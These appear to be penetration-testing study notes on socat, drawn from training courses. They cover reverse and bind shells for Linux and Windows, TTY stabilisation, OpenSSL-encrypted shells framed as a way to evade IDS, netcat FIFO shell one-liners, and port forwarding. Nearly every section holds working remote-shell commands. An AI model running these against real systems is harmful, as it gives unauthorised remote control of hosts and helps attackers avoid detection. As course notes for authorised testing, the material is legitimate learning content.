## Socat
Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

### Reverse shells
reverse listener: `socat TCP-L:<port> -`
socat equivalent of `nc -lvnp <port>`

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`  

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.  

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

fully stable linux listener: `socat TCP-L:<port> FILE:`tty`,raw,echo=0`
fully stable connector (requires socat on both ends): 
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`  

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
    
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.
### Bind shells
On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`  

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

regardless of target, waiting listener command would be:
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

### setting up socat to bridge networks

`socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`
---ddd is verbose
fork means fork into new subprocess upon connection instead of dying

### encrypted socat

socat supports encrypted connections, which is helpful to evade IDS.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`  
  
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.  

We then need to merge the two created files into a single `.pem` file:

`cat shell.key shell.crt > shell.pem`  

Now, when we set up our reverse shell listener, we use:

  `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`  

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate _must_ be used on whichever device is listening.  

  To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`  

  The same technique would apply for a bind shell:

Target:

  `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
## Other methods
It should also be noted that Socat is not the only way to create port forwards on *NIX hosts. There are several alternatives, of note:

- _rinetd_[3](https://portal.offsec.com/courses/pen-200-44065/learning/port-redirection-and-ssh-tunneling-48849/port-forwarding-with-linux-tools-48918/port-forwarding-with-socat-48850#fn-local_id_38-3) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions.
    
- We can combine Netcat and a _FIFO_[4](https://portal.offsec.com/courses/pen-200-44065/learning/port-redirection-and-ssh-tunneling-48849/port-forwarding-with-linux-tools-48918/port-forwarding-with-socat-48850#fn-local_id_38-4) named pipe file to create a port forward.[5](https://portal.offsec.com/courses/pen-200-44065/learning/port-redirection-and-ssh-tunneling-48849/port-forwarding-with-linux-tools-48918/port-forwarding-with-socat-48850#fn-local_id_38-5)
- `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- _The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._
- `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- reverse shell version of the above command
    
- If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/[interface]/forwarding** (if it's not already configured to allow it).
